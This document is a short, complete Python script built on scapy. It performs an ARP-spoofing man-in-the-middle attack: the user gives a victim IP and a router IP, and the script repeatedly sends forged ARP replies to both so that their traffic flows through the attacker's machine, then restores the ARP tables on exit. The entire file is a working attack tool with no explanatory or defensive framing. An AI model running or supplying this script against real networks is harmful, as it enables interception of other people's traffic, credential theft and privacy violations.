from scapy.all import *
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
    """
    Sends a spoofed ARP reply to the target (victim or router), telling them that
    'source_ip' is at our MAC address.
    """
    packet = ARP(op=2,               # "is-at" -> ARP reply
                 psrc=source_ip,     # Pretending to be this IP (spoofed IP)
                 pdst=dest_ip,       # Who we are sending the packet to
                 hwdst=dest_mac)     # The MAC address of the destination
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    """
    Sends a legitimate ARP reply to restore original MAC<->IP mapping.
    """
    packet = ARP(op="is-at", 
                 hwsrc=source_mac,
                 psrc=source_ip, 
                 hwdst=dest_mac, 
                 pdst=dest_ip)
    send(packet, verbose=False)

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <victim_ip> <router_ip>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    if not victim_mac or not router_mac:
        print("[-] Failed to get MAC address. Make sure the IPs are in the same network.")
        sys.exit(1)

    try:
        print("[+] Sending spoofed ARP packets. Press CTRL+C to stop...")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)  # Tell victim: "router is at my MAC"
            arp_spoof(router_ip, router_mac, victim_ip)  # Tell router: "victim is at my MAC"
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Restoring ARP tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print("[+] ARP tables restored. Exiting.")
        sys.exit(0)

main()
